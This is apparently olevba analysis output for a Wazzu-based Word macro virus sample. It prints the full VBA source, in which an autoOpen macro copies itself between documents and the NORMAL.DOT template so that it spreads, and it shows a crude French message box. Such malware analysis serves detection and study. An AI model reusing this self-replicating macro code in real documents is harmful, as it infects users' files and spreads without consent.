olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wazzu-based-f082e05f551fab6126b61d1acef1e785339a9673
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wazzu-based-f082e05f551fab6126b61d1acef1e785339a9673 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoOpen.bas 
in file: Virus.MSWord.Wazzu-based-f082e05f551fab6126b61d1acef1e785339a9673 - OLE stream: 'Macros/VBA/autoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim fM$
Dim glM$
Dim MF$
    On Error GoTo -1: On Error GoTo errC
        
    WordBasic.FileSummaryInfo Update:=1
    Dim zut As Object: Set zut = WordBasic.DialogRecord.FileSummaryInfo(False)
    WordBasic.CurValues.FileSummaryInfo zut

    fM$ = zut.Directory + "\" + zut.FileName + ":autoOpen"
    glM$ = "Global:autoOpen"
    MF$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

    If MF$ = "NORMAL.DOT" Then
        WordBasic.MacroCopy glM$, fM$
        WordBasic.FileSaveAs Format:=1
    Else
        WordBasic.MacroCopy fM$, glM$
    End If

    Pay

GoTo bye
errC:

bye:
    On Error GoTo -1: On Error GoTo 0

End Sub

Private Sub Pay()
    WordBasic.MsgBox "Wazzu n'est pas mort.", "car il bande encore", 48

End Sub

Private Sub Merde()
Dim wordNum
    WordBasic.FileSummaryInfo Update:=1
    Dim zut As Object: Set zut = WordBasic.DialogRecord.DocumentStatistics(False)
    WordBasic.CurValues.DocumentStatistics zut

    wordNum = WordBasic.Int(Rnd() * WordBasic.Val(zut.Words))
    WordBasic.StartOfDocument
    WordBasic.WordRight wordNum
End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Wazzu-based-f082e05f551fab6126b61d1acef1e785339a9673 - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

